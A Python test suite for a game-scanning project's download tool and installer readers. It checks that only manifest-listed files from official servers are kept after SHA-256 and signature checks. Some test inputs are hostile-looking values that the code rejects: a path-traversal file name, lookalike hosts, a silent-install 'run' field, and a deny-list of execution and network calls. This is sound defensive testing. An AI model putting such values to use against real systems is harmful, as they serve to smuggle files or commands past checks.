class FetchManifestTests(unittest.TestCase):
    """``tools/manifest.json`` and ``tools/fetch.py`` (open item 19, step 1; phageo, 2026-10-12):
    one list of every outside file - name, official address, SHA-256, size, licence note -
    and a fetcher that downloads only what is listed, refuses any mismatch and never runs
    what it fetched. Tested offline: a local file stands in for the server."""

    def setUp(self):
        tools = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools")
        sys.path.insert(0, tools)
        self.addCleanup(sys.path.remove, tools)
        import fetch
        self.fetch = fetch
        self.tmp = tempfile.mkdtemp(prefix="gss-fetch-")
        self.addCleanup(__import__("shutil").rmtree, self.tmp, True)

    def row(self, data, **changes):
        import hashlib
        row = {"file": "pack.zip", "url": "https://github.com/example/pack/releases/download/1/pack.zip",
               "sha256": hashlib.sha256(data).hexdigest(), "size": len(data),
               "licence": "MIT licence.", "groups": ["archives"]}
        row.update(changes)
        return row

    def served(self, data):
        """Stands in for the server: answers every address with ``data``, and counts."""
        asked = []

        def opener(url):
            asked.append(url)
            return io.BytesIO(data)
        return opener, asked

    def test_the_manifest_lists_what_the_tables_and_the_tests_use(self):
        import hashlib
        from gamescan import electron_official, engine_hashes, inno_official, library_hashes
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        self.addCleanup(sys.path.pop, 0)
        import build_installers
        manifest = self.fetch.load()
        by_url = {row["url"]: row for row in manifest.values()}
        self.assertEqual(len(by_url), len(manifest), "no address twice")
        recorded = [(row[3], row[4]) for row in engine_hashes.ARCHIVES]
        # (jQuery, SDL2 and OpenAL Soft, and the Electron releases taken for their code files only, are
        # in manifests of their own since 2026-10-19: tools/manifest_libraries.json, manifest_electron.json)
        added = {row["url"] for name in ("manifest_libraries.json", "manifest_electron.json")
                 if os.path.isfile(os.path.join(os.path.dirname(self.fetch.__file__), name))
                 for row in self.fetch.load(os.path.join(os.path.dirname(self.fetch.__file__), name)).values()}
        recorded += [(row[2], row[3]) for row in library_hashes.ARCHIVES if row[2] not in added]
        recorded += [(row[1], row[2]) for row in inno_official.ARCHIVES]
        recorded += [(row[2], row[3]) for row in electron_official.ARCHIVES if row[2] not in added]
        self.assertEqual(len(added & set(by_url)), 0, "an address in one manifest only")
        from gamescan import directx_official
        recorded.append(directx_official.PACKAGE[1:])        # (since 2026-10-17)
        recorded += [(build_installers.NSIS_URL, build_installers.NSIS_SHA256),
                     (build_installers.INNO_URL, build_installers.INNO_SHA256)]
        recorded += list(build_installers.INNO_OLD.values())
        for url, digest in recorded:
            self.assertEqual(by_url[url]["sha256"], digest, url)
            self.assertIs(self.fetch.listed(url, digest, manifest), by_url[url])
        # (clean games for the false-positive benchmark are listed too, in a group of their own:
        # no table and no test is built from them)
        samples = {row["url"] for row in manifest.values() if row["groups"] == ["samples"]}
        self.assertEqual(set(by_url) - samples, {url for url, _digest in recorded}, "and nothing else is listed")
        # one (ELE-01's) in the project; none in the source release, which leaves sample rows out
        # (tools/export_source.py, phageo 2026-10-25)
        self.assertLessEqual(len(samples), 1)
        self.assertTrue(all("ELE-01" in row["what"] for row in manifest.values() if row["url"] in samples))
        for index, md5 in engine_hashes.ARCHIVE_MD5.items():
            self.assertEqual(by_url[engine_hashes.ARCHIVES[index][3]]["md5"], md5)
        for name, row in manifest.items():
            self.assertEqual(self.fetch._entry_problem(row), "", name)
            self.assertGreater(len(row["licence"]), 10, name)
            self.assertIn(row["url"].split("/")[2], self.fetch.HOSTS, name)
        self.assertEqual([name for name, row in manifest.items() if row["size"] is None], [],
                         "every listed file has its size (the NSIS zip since its download on 2026-10-12)")
        self.assertEqual(manifest["nsis-3.13.zip"]["groups"], ["archives", "test-tools"])
        # the publishers' checksum lists the engine builder reads are the rows' own
        tools = os.path.dirname(self.fetch.__file__)
        import build_engine_hashes
        for _engine, _version, _build, url, listing in build_engine_hashes.SOURCES:
            self.assertEqual(by_url[url]["listing"], listing, url)
        self.assertEqual(sum(1 for row in manifest.values() if "listing" in row),
                         len(build_engine_hashes.SOURCES)
                         + len([row for row in electron_official.ARCHIVES if row[2] not in added]),
                         "(the Electron zips name the Electron project's list: ElectronRuntimeTableTests)")
        # the tools that build the tables have no download of their own (step 2, 2026-10-12)
        for name in ("build_engine_hashes.py", "build_library_hashes.py", "build_inno_tables.py",
                     "build_nsis_tables.py", "build_electron_tables.py"):
            with open(os.path.join(tools, name), "r", encoding="utf-8") as fh:
                source = fh.read()
            for word in ("urllib", "urlopen", "http.client", "socket", "requests"):
                self.assertNotIn(word, source, name)
            self.assertIn("fetch.", source, name)
        self.assertEqual([name for name, row in manifest.items() if "test-tools" in row["groups"]],
                         ["innosetup-5.5.9-unicode.exe", "innosetup-5.6.1-unicode.exe", "innosetup-6.0.5.exe",
                          "innosetup-6.2.2.exe", "innosetup-6.4.3.exe", "innosetup-6.7.3.exe", "nsis-3.13.zip"])
        # the files on this PC are the listed ones: every size, and the SHA-256 of the small ones
        seen = 0
        for name, row in manifest.items():
            path = os.path.join(ENGINE_ARCHIVES, name)
            if not os.path.isfile(path):
                continue
            seen += 1
            self.assertEqual(os.path.getsize(path), row["size"], name)
            if row["size"] < 16 << 20:
                with open(path, "rb") as fh:
                    self.assertEqual(hashlib.sha256(fh.read()).hexdigest(), row["sha256"], name)
                self.assertEqual(self.fetch.difference(row, path), "", name)
        if not seen:
            self.skipTest("the official archives are not on this PC: " + ENGINE_ARCHIVES)
        self.assertEqual(seen, len(manifest) - len(samples), "(the samples are kept elsewhere)")

    def test_the_table_builders_get_their_files_through_the_fetcher(self):
        """``obtain`` and ``read_listing`` - what the four table builders use instead of a
        download of their own: only a row of the manifest, compared with its SHA-256,
        whether the file was just fetched or was already there."""
        data = b"PK\x03\x04 an official archive " * 300
        row = self.row(data, listing="https://github.com/example/pack/releases/download/1/SHA256SUMS")
        manifest = {"pack.zip": row}
        target = os.path.join(self.tmp, "pack.zip")
        opener, asked = self.served(data)
        # offline: a missing file is said, nothing is asked for
        with self.assertRaises(self.fetch.FetchError) as missing:
            self.fetch.obtain(row["url"], target, offline=True, manifest=manifest, opener=opener)
        self.assertIn("missing (offline)", str(missing.exception))
        self.assertEqual((asked, os.listdir(self.tmp)), ([], []))
        # an address that is not listed is refused, online or not
        with self.assertRaises(self.fetch.FetchError):
            self.fetch.obtain("https://github.com/example/other.zip", target, manifest=manifest, opener=opener)
        self.assertEqual(asked, [])
        # missing and allowed to download: fetched and compared
        self.assertIs(self.fetch.obtain(row["url"], target, manifest=manifest, opener=opener,
                                        say=lambda line: None), row)
        self.assertEqual(asked, [row["url"]])
        # there already: compared, never asked for again - also offline
        self.assertIs(self.fetch.obtain(row["url"], target, offline=True, manifest=manifest, opener=opener), row)
        self.assertEqual(len(asked), 1)
        # there already and not the listed file: refused, offline too (the builders did not
        # compare a kept archive with anything before)
        with open(target, "wb") as fh:
            fh.write(data[:-1] + b"!")
        for offline in (True, False):
            with self.assertRaises(self.fetch.FetchError) as wrong:
                self.fetch.obtain(row["url"], target, offline=offline, manifest=manifest, opener=opener)
            self.assertIn("is not the listed file", str(wrong.exception))
        self.assertEqual(len(asked), 1)
        # a publisher's checksum list: only the one a row names
        listing, asked = self.served(b"abc  pack.zip\n")
        self.assertEqual(self.fetch.read_listing(row["listing"], manifest, listing), "abc  pack.zip\n")
        for url in (row["url"], "https://github.com/example/pack/other.txt", "https://example.invalid/SHA256SUMS"):
            with self.assertRaises(self.fetch.FetchError, msg=url):
                self.fetch.read_listing(url, manifest, listing)
        self.assertEqual(asked, [row["listing"]])
        for bad in ("http://github.com/x", "https://example.invalid/x"):
            self.assertIn("checksum list", self.fetch._entry_problem(dict(row, listing=bad)), bad)

    def test_a_lost_connection_is_tried_again_a_mismatch_never(self):
        """Up to three tries with a short wait when the server cannot be reached or the
        connection breaks (renpy.org answered only the second try on 2026-10-12) - and never
        after a mismatch: what came and is not the listed file is refused at once."""
        import urllib.error
        data = b"PK\x03\x04 an official archive " * 300
        row = self.row(data)
        target = os.path.join(self.tmp, "pack.zip")
        self.assertEqual((self.fetch.TRIES, self.fetch.RETRY_WAIT), (3, 5))
        waits, lines = [], []
        self.addCleanup(setattr, self.fetch.time, "sleep", self.fetch.time.sleep)
        self.fetch.time.sleep = waits.append

        class Breaks(io.BytesIO):                    # the connection breaks in the middle
            def read(self, size=-1):
                if self.tell():
                    raise ConnectionResetError("connection reset")
                return super().read(100)

        def server(*answers):
            asked, left = [], list(answers)

            def opener(url):
                asked.append(url)
                answer = left.pop(0)
                if isinstance(answer, BaseException):
                    raise answer
                return answer
            return opener, asked

        # no connection twice, then the file: fetched at the third try, after two waits
        opener, asked = server(TimeoutError("timed out"), urllib.error.URLError("no route"), io.BytesIO(data))
        self.assertEqual(self.fetch.fetch(row, target, opener, lines.append), "downloaded")
        self.assertEqual((len(asked), waits), (3, [5, 5]))
        self.assertEqual(len([line for line in lines if "no connection" in line]), 2)
        with open(target, "rb") as fh:
            self.assertEqual(fh.read(), data)
        os.remove(target)
        # a connection that breaks in the middle: nothing of the half file is kept or counted
        del waits[:]
        opener, asked = server(Breaks(data), io.BytesIO(data))
        self.assertEqual(self.fetch.fetch(row, target, opener, lines.append), "downloaded")
        self.assertEqual((len(asked), waits), (2, [5]))
        os.remove(target)
        # three times no connection: given up, nothing left behind
        del waits[:]
        opener, asked = server(*[TimeoutError("timed out")] * 5)
        with self.assertRaises(self.fetch.FetchError) as gone:
            self.fetch.fetch(row, target, opener, lines.append)
        self.assertIn("3 tries", str(gone.exception))
        self.assertEqual((len(asked), waits, os.listdir(self.tmp)), (3, [5, 5], []))
        # a mismatch is never tried again: another file, a file of another size, too much data
        for wrong in (data[:-1] + b"!", data[:-10], data + data):
            del waits[:]
            opener, asked = server(io.BytesIO(wrong), io.BytesIO(data))
            with self.assertRaises(self.fetch.FetchError):
                self.fetch.fetch(row, target, opener, lines.append)
            self.assertEqual((len(asked), waits, os.listdir(self.tmp)), (1, [], []))
        # ... nor an answer of the server that is an error, nor a redirect away from the official servers
        for answer in (urllib.error.HTTPError(row["url"], 404, "Not Found", None, None),
                       self.fetch.FetchError("redirected away from the official servers")):
            opener, asked = server(answer, io.BytesIO(data))
            with self.assertRaises(self.fetch.FetchError):
                self.fetch.fetch(row, target, opener, lines.append)
            self.assertEqual((len(asked), waits, os.listdir(self.tmp)), (1, [], []))

    def test_a_manifest_that_is_not_complete_is_refused(self):
        import json
        good = self.row(b"data")

        def load(rows):
            path = os.path.join(self.tmp, "manifest.json")
            with open(path, "w", encoding="utf-8") as fh:
                json.dump(rows, fh)
            return self.fetch.load(path)

        self.assertEqual(list(load({"files": [good]})), ["pack.zip"])
        self.assertEqual(list(load({"files": [dict(good, size=None)]})), ["pack.zip"])
        bad = {
            "http": dict(good, url="http://github.com/example/pack.zip"),
            "another server": dict(good, url="https://github.com.example.invalid/pack.zip"),
            "a server that is not listed": dict(good, url="https://example.invalid/pack.zip"),
            "a path as the name": dict(good, file="..\\pack.zip"),
            "a folder in the name": dict(good, file="sub/pack.zip"),
            "a short hash": dict(good, sha256="abc"),
            "an upper-case hash": dict(good, sha256=good["sha256"].upper()),
            "no size": {k: v for k, v in good.items() if k != "size"},
            "a size that is no number": dict(good, size="4"),
            "no licence note": dict(good, licence=" "),
            "no group": dict(good, groups=[]),
            "an unknown group": dict(good, groups=["games"]),
            "an unknown field": dict(good, run="setup.exe /S"),
        }
        for label, row in bad.items():
            with self.assertRaises(self.fetch.FetchError, msg=label):
                load({"files": [row]})
        for label, rows in (("listed twice", {"files": [good, dict(good, file="PACK.zip")]}),
                            ("no list", {"files": []}), ("not a manifest", [good])):
            with self.assertRaises(self.fetch.FetchError, msg=label):
                load(rows)
        with self.assertRaises(self.fetch.FetchError):
            self.fetch.load(os.path.join(self.tmp, "missing.json"))

    def test_a_first_download_is_done_once_and_then_refused_until_its_hash_is_listed(self):
        # (phageo, 2026-10-17: a publisher that states no SHA-256 - Microsoft's DirectX package)
        data = b"MZ the package " * 300
        row, target = self.row(data, sha256=None, size=None, first="no SHA-256 is published",
                               publisher="Example Publisher"), os.path.join(self.tmp, "pack.zip")
        self.assertEqual(self.fetch._entry_problem(row), "")
        self.assertIn("no SHA-256", self.fetch._entry_problem({k: v for k, v in row.items() if k != "first"}))
        listed = self.row(data, first="left in")
        self.assertIn("take the", self.fetch._entry_problem(listed))
        # (the signature check itself: test_a_first_download_is_kept_only_with_its_publishers_signature)
        self.addCleanup(setattr, self.fetch, "publisher_of", self.fetch.publisher_of)
        self.fetch.publisher_of = lambda path: "Example Publisher"
        opener, asked = self.served(data)
        lines = []
        self.assertEqual(self.fetch.fetch(row, target, opener, lines.append), "downloaded (first download)")
        self.assertIn(self.row(data)["sha256"], lines[-1])
        with self.assertRaises(self.fetch.FetchError):            # a second time: refused
            self.fetch.fetch(row, target, opener, lines.append)
        self.assertIn("no SHA-256 listed yet", self.fetch.difference(row, target))
        self.assertEqual(len(asked), 1)
        self.assertEqual(self.fetch.fetch(self.row(data), target, opener, lines.append), "already there")

    def test_a_first_download_is_kept_only_with_its_publishers_signature(self):
        """(phageo, 2026-10-17) A row without a SHA-256 names its publisher, and the first download
        is kept only when Windows' own check (WinVerifyTrust) finds a valid signature of exactly
        that publisher - else it is deleted and refused. The real check, no stand-in."""
        def row(data, **changes):
            return self.row(data, **dict(dict(sha256=None, size=None, first="no SHA-256 is published",
                                              publisher="Microsoft Corporation"), **changes))
        unsigned = b"MZ" + b"\0" * 4000
        for label, bad in (("no publisher", {k: v for k, v in row(unsigned).items() if k != "publisher"}),
                           ("an empty publisher", row(unsigned, publisher=" ")),
                           ("a publisher that is no text", row(unsigned, publisher=["Microsoft"]))):
            self.assertIn("publisher", self.fetch._entry_problem(bad), label)
        target = os.path.join(self.tmp, "pack.zip")
        # no signature at all: refused, nothing kept (no .part either)
        with self.assertRaises(self.fetch.FetchError) as refused:
            self.fetch.fetch(row(unsigned), target, self.served(unsigned)[0], say=lambda line: None)
        self.assertIn("no valid signature", str(refused.exception))
        self.assertEqual(os.listdir(self.tmp), [])
        package = os.path.join(ENGINE_ARCHIVES, "directx_Jun2010_redist.exe")
        if sys.platform != "win32" or not os.path.isfile(package):
            self.skipTest("needs Windows and the DirectX package in the official archives")
        with open(package, "rb") as fh:
            signed = fh.read()
        self.assertEqual(self.fetch.publisher_of(package), "Microsoft Corporation")
        # signed validly, but by another publisher than the row names (also a near name): refused
        for other in ("Microsoft", "microsoft corporation", "Example Publisher"):
            with self.assertRaises(self.fetch.FetchError, msg=other) as refused:
                self.fetch.fetch(row(signed, publisher=other), target, self.served(signed)[0], say=lambda line: None)
            self.assertIn("signed by 'Microsoft Corporation'", str(refused.exception))
            self.assertEqual(os.listdir(self.tmp), [], other)
        # one byte changed: the signature is no longer valid
        broken = signed[:len(signed) // 2] + bytes([signed[len(signed) // 2] ^ 1]) + signed[len(signed) // 2 + 1:]
        with self.assertRaises(self.fetch.FetchError) as refused:
            self.fetch.fetch(row(broken), target, self.served(broken)[0], say=lambda line: None)
        self.assertIn("no valid signature", str(refused.exception))
        self.assertEqual(os.listdir(self.tmp), [])
        # the publisher's own signature: kept, and said
        lines = []
        self.assertEqual(self.fetch.fetch(row(signed), target, self.served(signed)[0], lines.append),
                         "downloaded (first download)")
        self.assertIn("validly signed by Microsoft Corporation", lines[-1])
        self.assertEqual(os.listdir(self.tmp), ["pack.zip"])

    def test_only_the_listed_file_is_kept(self):
        data = b"PK\x03\x04 the listed archive " * 500
        row, target = self.row(data), os.path.join(self.tmp, "pack.zip")
        opener, asked = self.served(data)
        self.assertEqual(self.fetch.fetch(row, target, opener, say=lambda line: None), "downloaded")
        self.assertEqual(asked, [row["url"]])
        with open(target, "rb") as fh:
            self.assertEqual(fh.read(), data)
        self.assertEqual(os.listdir(self.tmp), ["pack.zip"], "no .part file is left")
        self.assertEqual(self.fetch.difference(row, target), "")
        # already there: compared, not asked for again
        self.assertEqual(self.fetch.fetch(row, target, opener, say=lambda line: None), "already there")
        self.assertEqual(len(asked), 1)
        # a size that is not listed: the SHA-256 alone decides
        other = os.path.join(self.tmp, "other.zip")
        self.assertEqual(self.fetch.fetch(dict(row, size=None), other, opener, say=lambda line: None), "downloaded")

    def test_every_mismatch_is_refused_and_nothing_is_kept(self):
        data = b"PK\x03\x04 the listed archive " * 500
        row = self.row(data)
        answers = {
            "one byte changed": data[:-1] + b"!",
            "cut short": data[:100],
            "longer than listed": data + b"more",
            "empty": b"",
            "far too much": data * 50,
        }
        for label, answer in answers.items():
            target = os.path.join(self.tmp, "pack.zip")
            with self.assertRaises(self.fetch.FetchError, msg=label):
                self.fetch.fetch(row, target, self.served(answer)[0], say=lambda line: None)
            self.assertEqual(os.listdir(self.tmp), [], label + ": nothing of the download is kept")
        # the same without a listed size: the SHA-256 refuses it
        with self.assertRaises(self.fetch.FetchError):
            self.fetch.fetch(dict(row, size=None), os.path.join(self.tmp, "pack.zip"),
                             self.served(data + b"more")[0], say=lambda line: None)
        self.assertEqual(os.listdir(self.tmp), [])
        # a server that fails
        def broken(url):
            raise OSError("no connection")
        with self.assertRaises(self.fetch.FetchError):
            self.fetch.fetch(row, os.path.join(self.tmp, "pack.zip"), broken, say=lambda line: None)
        self.assertEqual(os.listdir(self.tmp), [])
        # a file that is already there and is not the listed one: refused, left as it is, no request
        target = os.path.join(self.tmp, "pack.zip")
        with open(target, "wb") as fh:
            fh.write(b"something else")
        opener, asked = self.served(data)
        with self.assertRaises(self.fetch.FetchError) as caught:
            self.fetch.fetch(row, target, opener, say=lambda line: None)
        self.assertIn("left as it is", str(caught.exception))
        self.assertEqual(asked, [])
        with open(target, "rb") as fh:
            self.assertEqual(fh.read(), b"something else")
        self.assertIn("size", self.fetch.difference(row, target))
        self.assertEqual(self.fetch.difference(row, os.path.join(self.tmp, "none.zip")), "missing")

    def test_only_what_is_listed_and_only_official_servers(self):
        data = b"data"
        manifest = {"pack.zip": self.row(data)}
        row = manifest["pack.zip"]
        self.assertIs(self.fetch.listed(row["url"], row["sha256"], manifest), row)
        for label, (url, digest) in {
                "an address that is not listed": ("https://github.com/example/other.zip", row["sha256"]),
                "listed with another SHA-256": (row["url"], "0" * 64),
                "no SHA-256": (row["url"], "")}.items():
            with self.assertRaises(self.fetch.FetchError, msg=label):
                self.fetch.listed(url, digest, manifest)
        # a row that is not well-formed is not fetched, whoever hands it over
        opener, asked = self.served(data)
        for label, bad in {"http": dict(row, url="http://github.com/x.zip"),
                           "another server": dict(row, url="https://example.invalid/x.zip"),
                           "no hash": dict(row, sha256="")}.items():
            with self.assertRaises(self.fetch.FetchError, msg=label):
                self.fetch.fetch(bad, os.path.join(self.tmp, "x.zip"), opener, say=lambda line: None)
        self.assertEqual((asked, os.listdir(self.tmp)), ([], []))
        # the real opener asks official servers only (refused before any connection)
        for url in ("http://github.com/a.zip", "https://example.invalid/a.zip", "file:///C:/a.zip",
                    "https://github.com.example.invalid/a.zip"):
            with self.assertRaises(self.fetch.FetchError, msg=url):
                self.fetch._open(url)
        for url, allowed in (("https://objects.githubusercontent.com/a", True),
                             ("https://netcologne.dl.sourceforge.net/a", True),
                             ("https://dl.node-webkit.org/a", True),
                             ("http://objects.githubusercontent.com/a", False),
                             ("https://dl.sourceforge.net.example.invalid/a", False),
                             ("https://example.invalid/a", False)):
            self.assertEqual(self.fetch._redirect_allowed(url), allowed, url)
        # the command line takes names from the manifest, never an address
        import contextlib
        said = io.StringIO()
        with contextlib.redirect_stdout(said), contextlib.redirect_stderr(said):
            self.assertEqual(self.fetch.main(["--list"]), 0)
            self.assertEqual(self.fetch.main(["--check", "--to", self.tmp, "https://example.invalid/a.zip"]), 1)
            self.assertEqual(self.fetch.main(["--check", "--to", self.tmp, "nsis-3.13.zip"]), 1,
                             "missing: not as listed")
        self.assertIn("not listed in the manifest: https://example.invalid/a.zip", said.getvalue())
        self.assertIn("missing", said.getvalue())
        self.assertEqual(os.listdir(self.tmp), [], "a check fetches nothing")

    def test_the_fetcher_runs_nothing(self):
        """It writes bytes and hashes them: nothing in it can start, unpack or load a file."""
        import ast
        with open(self.fetch.__file__, "r", encoding="utf-8") as fh:
            tree = ast.parse(fh.read())
        imported = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                imported |= {alias.name.split(".")[0] for alias in node.names}
            elif isinstance(node, ast.ImportFrom):
                imported.add((node.module or "").split(".")[0])
        # ("http": only the name of the error a connection that breaks in the middle gives)
        # ("gamescan": its trust module only - Windows' signature check of a first download, which
        # reads the file and runs nothing; phageo, 2026-10-17)
        self.assertEqual(imported, {"__future__", "argparse", "base64", "hashlib", "http", "json", "os", "re", "sys",
                                    "time", "typing", "urllib", "gamescan"})
        self.assertEqual({tuple(alias.name for alias in node.names) for node in ast.walk(tree)
                          if isinstance(node, ast.ImportFrom) and node.module == "gamescan"}, {("trust",)})
        called = {node.func.attr for node in ast.walk(tree)
                  if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)}
        called |= {node.func.id for node in ast.walk(tree)
                   if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)}
        for name in ("system", "popen", "startfile", "spawnv", "execv", "run", "Popen", "extractall", "extract",
                     "exec", "eval", "__import__", "import_module", "loads", "ZipFile"):
            self.assertNotIn(name, called, name)

    def test_the_installer_tests_download_through_the_fetcher(self):
        """``GSS_BUILD_INSTALLERS=1`` (``tests/build_installers.py``) has no download of its
        own: its compilers come through ``fetch.py``, so only a listed file with the pinned
        SHA-256 is kept. Nothing is downloaded or run here."""
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        self.addCleanup(sys.path.pop, 0)
        import build_installers
        with open(build_installers.__file__, "r", encoding="utf-8") as fh:
            source = fh.read()
        self.assertNotIn("urllib", source)
        self.assertNotIn("urlopen", source)
        self.addCleanup(setattr, self.fetch, "_open", self.fetch._open)
        target = os.path.join(self.tmp, "nsis.zip")
        self.fetch._open = self.served(b"not the compiler")[0]
        with self.assertRaises(build_installers.BuildError) as caught:
            build_installers._download(build_installers.NSIS_URL, target, build_installers.NSIS_SHA256)
        self.assertIn("nsis-3.13.zip", str(caught.exception))
        self.assertEqual(os.listdir(self.tmp), [], "the wrong download is not kept")
        asked = []
        self.fetch._open = lambda url: asked.append(url) or io.BytesIO(b"x")
        for label, (url, pinned) in {
                "an address that is not listed": ("https://github.com/example/tool.exe", "0" * 64),
                "a listed address with another pin": (build_installers.NSIS_URL, "0" * 64)}.items():
            with self.assertRaises(build_installers.BuildError, msg=label):
                build_installers._download(url, target, pinned)
        self.assertEqual((asked, os.listdir(self.tmp)), ([], []), "refused before anything is asked for")
        # the right file is kept: the pinned Inno Setup installer, served from the archives folder
        local = os.path.join(ENGINE_ARCHIVES, "innosetup-6.7.3.exe")
        if not os.path.isfile(local):
            self.skipTest("not on this PC: " + local)
        self.fetch._open = lambda url: open(local, "rb")
        target = os.path.join(self.tmp, "innosetup-setup.exe")
        self.assertEqual(build_installers._download(build_installers.INNO_URL, target, build_installers.INNO_SHA256),
                         build_installers.INNO_SHA256)
        self.assertEqual(os.path.getsize(target), os.path.getsize(local))


class InstallerTestsWithoutToolsTests(unittest.TestCase):
    """On a PC without ``tests/_tools`` (phageo, 2026-10-12): each installer test skips on a
    line of its own, and the skip text does not offer a switch that downloads compilers."""

    def test_every_installer_test_skips_on_its_own_line(self):
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        self.addCleanup(sys.path.pop, 0)
        import build_installers
        self.addCleanup(setattr, build_installers, "tools_ready", build_installers.tools_ready)
        build_installers.tools_ready = lambda: False
        switch = os.environ.pop("GSS_BUILD_INSTALLERS", None)
        if switch is not None:
            self.addCleanup(os.environ.__setitem__, "GSS_BUILD_INSTALLERS", switch)
        self.addCleanup(setattr, GeneratedInstallerTests, "skip_reason", GeneratedInstallerTests.skip_reason)
        suite = unittest.defaultTestLoader.loadTestsFromTestCase(GeneratedInstallerTests)
        result = unittest.TestResult()
        suite.run(result)
        count = suite.countTestCases()
        self.assertEqual(count, 12)          # (+1 on 2026-10-17, fifty-ninth message: NSIS file names)
        self.assertEqual((result.testsRun, result.errors, result.failures), (count, [], []))
        self.assertEqual(len(result.skipped), count, "one skip line per test")
        for _test, reason in result.skipped:
            if FAST and "slow set" in reason:        # (the fast run leaves these out before anything else)
                continue
            self.assertIn("not in tests/_tools", reason)
            self.assertIn("open item 19", reason)
            self.assertIn("tools/fetch.py", reason)
            self.assertNotIn("GSS_BUILD_INSTALLERS", reason)


class GeneratedInstallerTests(unittest.TestCase):
    """Real installers of a dummy RPG Maker game, built by the vendors' own
    compilers (see ``tests/build_installers.py``), must give back every file
    under its original name and with its original SHA-256.

    The tests run by themselves when the compilers are in ``tests/_tools``.
    Without them every test of this class skips on a line of its own (the
    count of skipped tests stays visible; phageo, 2026-10-12), and the skip text
    names the verified fetch script of open item 19 (``tools/fetch.py``) - not
    the switch ``GSS_BUILD_INSTALLERS=1``, which downloads compilers (CLAUDE.md,
    rule 14; since 2026-10-12 it downloads through that script)."""

    NO_TOOLS = ("the Inno Setup / NSIS compilers are not in tests/_tools; they come through "
                "tools/fetch.py, which downloads only what tools/manifest.json lists and refuses "
                "any other file (CLAUDE.md, open item 19; a download needs phageo's word - rule 14)")
    skip_reason = ""

    @classmethod
    def setUpClass(cls):
        import shutil
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        import build_installers
        cls.build = build_installers
        cls.skip_reason = ""
        if not build_installers.tools_ready() and os.environ.get("GSS_BUILD_INSTALLERS") != "1":
            cls.skip_reason = cls.NO_TOOLS              # (said by every test: setUp)
            return
        cls.work = tempfile.mkdtemp(prefix="gss-installers-")
        cls.addClassCleanup(shutil.rmtree, cls.work, True)
        try:
            cls.game, cls.installers = build_installers.build_all(cls.work)
        except (build_installers.BuildError, OSError) as exc:
            cls.skip_reason = "the installers could not be built: %s" % exc

    def setUp(self):
        if self.skip_reason:
            self.skipTest(self.skip_reason)

    def members(self, name):
        """``({member path: FileContext}, [what could not be read])`` as the scanner sees them."""
        from gamescan.handlers import NativePEHandler
        from gamescan.models import FileContext
        from gamescan.rules import RuleEngine
        with open(self.installers[name], "rb") as fh:
            data = fh.read()
        ctx = FileContext(path=self.installers[name], relpath=name + ".exe", data=data,
                          size=len(data), sha256="")
        ctx.pe = parse_pe(data)
        handler = NativePEHandler()
        handler.scan(ctx, RuleEngine())
        found = {child.relpath.split("!", 1)[1]: child for child in handler.expand(ctx)}
        return found, [f.evidence for f in handler.after_expand(ctx)]

    def scannable(self):
        from gamescan.handlers import containers
        return {name: data for name, data in self.game.items()
                if containers.ext_of(name) in containers.MEMBER_EXTS}

    def test_the_dummy_game_and_the_variants(self):
        self.assertEqual(sorted(self.installers), sorted(list(self.build.NSIS_VARIANTS)
                                                         + list(self.build.INNO_VARIANTS)))
        self.assertEqual(len(self.scannable()), 7)
        self.assertEqual(len(self.game), 9)
        for path in self.installers.values():
            with open(path, "rb") as fh:
                self.assertEqual(fh.read(2), b"MZ")

    def test_names_and_sha256_survive_extraction(self):
        import hashlib
        expected = {name: hashlib.sha256(data).hexdigest() for name, data in self.scannable().items()}
        for variant in self.installers:
            found, notes = self.members(variant)
            if variant == "nsis-bzip2":                 # no program reads it (phageo, 2026-10-20)
                self.assertTrue(notes, "NSIS bzip2 is reported as not inspected")
                continue
            self.assertEqual({name: found[name].sha256 for name in expected if name in found},
                             expected, variant)
            self.assertEqual(notes, [], variant)
            extra = set(found) - set(expected) - {"[installer script].bat"}
            self.assertFalse(extra, "nothing is invented: %s %s" % (variant, extra))

    def test_inno_setup_reader_rebuilds_every_file(self):
        import io
        from gamescan.unpack import inno
        for variant in self.build.INNO_VARIANTS:
            with open(self.installers[variant], "rb") as fh:
                data = fh.read()
            first = parse_pe(data).overlay_offset
            installer = inno.Installer(lambda: io.BytesIO(data), inno.find(data, first), first,
                                       inno.chunks(data, first))
            problems = []
            self.assertEqual(dict(installer.members(lambda n, s: True, problems=problems)),
                             self.game, variant)
            self.assertEqual(problems, [], variant)
            self.assertEqual(len(installer.entries), len(self.game))
            self.assertEqual({len(e.checksum) for e in installer.entries}, {32}, "SHA-256 records")
            self.assertEqual(dict(installer.members(lambda n, s: n == "Game.ini")),
                             {"Game.ini": self.game["Game.ini"]})

    def test_inno_setup_really_rewrites_programs_and_the_reader_undoes_it(self):
        import io
        from gamescan.unpack import inno
        program = self.game["Game.exe"]
        stored = {}
        for variant in ("inno-lzma", "inno-none"):
            with open(self.installers[variant], "rb") as fh:
                data = fh.read()
            first = parse_pe(data).overlay_offset
            installer = inno.Installer(lambda: io.BytesIO(data), inno.find(data, first), first,
                                       inno.chunks(data, first))
            index = next(i for i, name in installer.names.items() if name == "Game.exe")
            entry = installer.entries[index]
            raw = [r for _i, r in installer._cut(io.BytesIO(data), entry, [entry], [index])][0]
            stored[variant] = raw
            self.assertEqual((len(raw), raw[:2]), (len(program), b"MZ"), variant)
            self.assertEqual(inno.restore(raw, entry.checksum), program, variant)
            self.assertEqual(entry.checksum, __import__("hashlib").sha256(program).digest(),
                             "the installer's own checksum is the original file's SHA-256")
        self.assertNotEqual(stored["inno-lzma"], program,
                            "what is packed is NOT the original program: its CALL / JMP "
                            "operands were rewritten - a carved copy has another SHA-256")
        self.assertEqual(stored["inno-none"], program, "(no filter without compression)")
        damaged = bytearray(stored["inno-lzma"])
        damaged[600] ^= 1
        self.assertIsNone(inno.restore(bytes(damaged), entry.checksum),
                          "nothing is accepted when the checksum is not met")

    def test_nsis_reader_names_every_file(self):
        import io
        from gamescan.unpack import cab, nsis

        class Everything:
            limit = staticmethod(lambda name: 1 << 30)
            want = staticmethod(lambda name, size: True)

        for variant in self.build.NSIS_VARIANTS:
            with open(self.installers[variant], "rb") as fh:
                data = fh.read()
            at = nsis.find(data)
